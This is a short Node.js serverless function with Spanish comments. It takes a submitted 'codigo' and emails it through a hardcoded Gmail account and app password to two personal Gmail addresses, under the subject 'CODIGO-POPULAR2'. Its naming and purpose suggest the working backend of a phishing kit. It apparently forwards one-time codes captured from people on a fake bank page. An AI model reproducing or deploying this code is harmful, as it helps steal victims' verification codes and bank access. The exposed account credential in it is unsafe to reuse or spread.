const nodemailer = require('nodemailer');
require('dotenv').config();

exports.handler = async function(event, context) {
    const { codigo } = JSON.parse(event.body); // Solo obtenemos el código

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jazzysell123@gmail.com',
            pass: 'dfbcartjozqoeudc', // Verifica que esta contraseña sea correcta
        },
    });

    let mailOptions = {
        from: 'cuentaluperonp5@gmail.com',
        to: 'sierroalee@gmail.com, fendergriseldo@gmail.com',
        subject: '🔐CODIGO-POPULAR2',
        text: `🔐Código2: ${codigo}`, // Solo enviamos el código
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};